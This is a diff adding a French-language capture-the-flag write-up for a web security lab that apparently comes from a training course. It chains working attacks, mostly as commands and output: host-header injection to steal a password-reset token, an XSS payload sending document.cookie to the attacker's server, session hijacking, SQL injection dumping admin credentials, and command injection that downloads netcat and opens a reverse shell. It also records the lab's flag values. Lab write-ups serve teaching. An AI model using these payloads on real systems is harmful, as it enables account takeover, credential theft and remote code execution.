@@ -1,0 +1,145 @@
+1-host_header_injection.sh
+curl -X POST "$2" -H "HOST: $1" -d "$3"
+
+2-flag.txt
+10.42.6.156 web0x00.hbtn
+10.42.238.8 ubuntu
+10.8.0.6 kali (local machine)
+-----------------------------
+┌──(kali㉿kali)-[~/Documents]
+└─$ ssh -g -R 10.42.238.8:80:10.8.0.6:80 root@10.42.238.8
+root@10.42.238.8's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.10.210-201.855.amzn2.x86_64 x86_64
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Mar 28 14:11:23 2024 from 10.43.223.216
+root@ef5e9950e659482482cb0d07e67d5717-2377118072:~#
+
+root@ef5e9950e659482482cb0d07e67d5717-2377118072:~# nano /etc/ssh/sshd_config
+/** décommenté la ligne 89 GatewayPorts et activer la redirection par yes
+#GatewayPorts no
+GatewayPorts yes
+root@ef5e9950e659482482cb0d07e67d5717-2377118072:~# service ssh restart
+ * Restarting OpenBSD Secure Shell server sshd
+root@ef5e9950e659482482cb0d07e67d5717-2377118072:~# exit
+logout
+Connection to 10.42.238.8 closed.
+
+Il faut maintenant se reconnecter avec la redirection de port active:
+┌──(kali㉿kali)-[~/Documents]
+└─$ ssh -g -R 10.42.238.8:80:10.8.0.6:80 root@10.42.238.8
+root@10.42.238.8's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.10.210-201.855.amzn2.x86_64 x86_64
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Mar 28 14:11:23 2024 from 10.43.223.216
+root@ef5e9950e659482482cb0d07e67d5717-2377118072:~#
+
+La redirection de port maintenant effectuée.
+Dans un autre terminal se mettre en écoute:
+┌──(kali㉿kali)-[~/Documents]
+└─$ python3 -m http.server -b :: 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+
+Dans un autre terminal, lancer la requête vers la target:
+┌──(kali㉿kali)-[~/Documents]
+└─$ curl -X POST "http://web0x00.hbtn/reset_password" -H "Host: 10.42.238.8" -d "email=yosri@web0x00.hbtn"
+...
+<div class="alert_box">
+    <span>An e-mail was successfully sent to yosri@web0x00.hbtn</span>
+</div>
+...
+
+Retourner sur le terminal local en écoute:
+──(kali㉿kali)-[~/Documents]
+└─$ python3 -m http.server -b :: 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.8.0.6 - - [28/Mar/2024 15:28:39] code 404, message File not found
+::ffff:10.8.0.6 - - [28/Mar/2024 15:28:39] "GET /reset_password/4k8xBoOyJK8tjGK9ErpsLA2vulr99LVG HTTP/1.1" 404 -
+
+Aller sur l'interface Web http://web0x00.hbtn/reset_password/4k8xBoOyJK8tjGK9ErpsLA2vulr99LVG
+Mettre un nouveau mot de passe puis se connecter à l'interface.
+echo '1d63e82817cd53c316d08ae04b7c01ba' > 2-flag.txt
+
+3-xss_payload.txt
+<script>fetch(`http://<ubuntu ip>/${document.cookie}`)</script>
+Retourner sur le terminal local en écoute:
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server -b :: 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] code 404, message File not found
+::ffff:10.8.0.6 - - [17/Apr/2024 05:19:24] "GET /reset_password/YDVzdvLIOuLYfuLZnBsInRGavJblcSnm HTTP/1.1" 404 -
+::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] code 404, message File not found
+::ffff:10.8.0.6 - - [17/Apr/2024 05:24:06] "GET /session=.eJxFyjsKgDAQBcC7vDpIbFMpHsETJLhiID92E1TEu2sjtsNcGJfok8CsNggpTE1qjsSvVG4vzK2UzPUfFK0PMDizsB92cvrQuttcTVDwC0yv0IQ42Uhfw_0AkYMj6g.Zh-VNg.MWQCtcSPJKnMjlk_qnGfkV1mkb4 HTTP/1.1" 404 -
+::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] code 404, message File not found
+::ffff:10.8.0.6 - - [17/Apr/2024 05:24:12] "GET /session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.Zh-VOg.8JCGXo-A0Wx1Ul5BVpaEfqRVIjU HTTP/1.1" 404 -
+
+Le premier cookie reçu est le notre au moment où nous avons inséré le script, le second c'est celui du service support lorsqu'ils ont consulté notre ticket.
+Aller sur la page web: http://web0x00.hbtn/support
+et modifier le cookie actuel par celui du support puis actualiser la page:
+507cfc475830c8a8d6e8eadf3995a99d
+
+ticket?id=8 union select null,null,null,null,null,null; --
+ticket?id=8 union select username,username,username,username,username,username from Admins; --
+admin
+ticket?id=8 union select password,password,password,password,password,password from Admins; --
+A@a2f29896e2dd2
+
+http://web0x00.hbtn/admin
+username: admin
+password: A@a2f29896e2dd2
+7b649ba1fb7bea8199aac5cd161eefeb
+
+8.8.8.8 puis eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+
+8.8.8.8; whoami
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+root
+
+nous pouvons donc séparer les commandes par des points virgules.
+
+
+
+
+; wget https://github.com/yunchih/static-binaries/raw/master/nc; chmod 777 nc; ./nc -V
+
+reverse shell
+; ./nc local_ip -e bash
+
+; ./nc 10.42.229.68 80 -e bash;
+
+root@a4f2635eb92e4706af48d763fe10c834-2377118072:~# nc -nlvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.42.128.240 40058
+ls
+__pycache__
+app.py
+db.sql
+nc
+nginx.conf
+render.py
+requirements.txt
+static
+templates
+utils
+web0x00.sqlite3
+cd /root
+ls
+flag.txt
+cat flag.txt
+39553adf3894d1c8ff762f75e1f0d637
